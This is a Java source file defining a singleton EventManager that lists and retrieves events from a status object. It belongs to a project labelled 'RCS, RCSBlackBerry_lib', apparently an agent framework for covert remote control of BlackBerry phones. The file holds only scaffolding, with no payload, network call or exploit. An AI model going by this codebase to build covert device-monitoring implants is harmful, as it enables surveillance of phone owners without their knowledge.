/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : EventManager.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.util.Vector;

import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.interfaces.Singleton;
import com.ht.rcs.blackberry.threadpool.TimerJob;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public final class EventManager extends Manager implements Singleton {

    /** The debug instance. */
	//#debug
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = new EventManager();
        }

        return instance;
    }

    /**
     * Instantiates a new event manager.
     */
    private EventManager() {
        super();
    }

    public Vector getAllItems() {
        Vector events = statusObj.getEventsList();
        return events;
    }

    public TimerJob getItem(int id) {
        Event event = statusObj.getEvent(id);
        // #ifdef DBC
        Check.ensures(event.eventId == id, "Wrong id");
        // #endif
        return event;
    }

}
